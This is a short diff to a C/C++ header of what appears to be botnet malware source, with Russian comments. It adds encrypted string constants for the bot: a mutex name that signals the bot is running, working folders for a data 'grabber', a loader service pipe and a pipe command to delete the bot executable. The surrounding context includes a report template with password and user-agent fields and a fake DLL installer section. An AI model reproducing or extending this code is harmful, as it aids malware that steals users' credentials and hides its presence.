@@ -52,12 +52,20 @@ CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
 
 CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
 
-
+// Рабочии директории и файлы
 CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
 CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
+
+// Имена служебный пайпов
+CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера
+
+
+// Служебные команды, передаваемые через пайпы процессам
+CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота
+
 // Имена служебных фалов
-CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
+CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 
 
 // Перечень команд, которые может выполняь бот
@@ -101,6 +109,7 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 							 "Password: %s\r\n\r\n"
 							 "UserAgent: %s\r\n";
 #endif
+
 
 
 #ifdef FakeDllInstallerH
